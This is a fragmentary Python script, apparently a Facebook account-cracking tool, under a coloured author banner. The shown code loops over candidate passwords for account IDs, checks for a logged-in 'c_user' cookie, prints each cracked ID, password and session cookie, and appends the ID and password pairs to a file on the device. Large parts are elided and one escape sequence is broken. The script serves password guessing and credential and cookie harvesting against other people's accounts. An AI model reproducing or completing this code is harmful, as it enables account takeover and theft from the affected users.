...
\033[0;92m╚════════════════════════════════════════╝
\33[1;91m╔════════════════════════════════════════╗
\33[1;92m║[•] Author    : EVAN           
\33[1;92m║[•] Facebook  : EVAN            
\33[1;92m║[•] Whatsapp  : +***********           
\33[1;92m║[•] Github    : TARGET-KING        
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[EVAN -OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎😍]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/EVAN -OK.txt', 'a').write( uid+' | '+ps+'\y')
                oks.append(uid)
                break
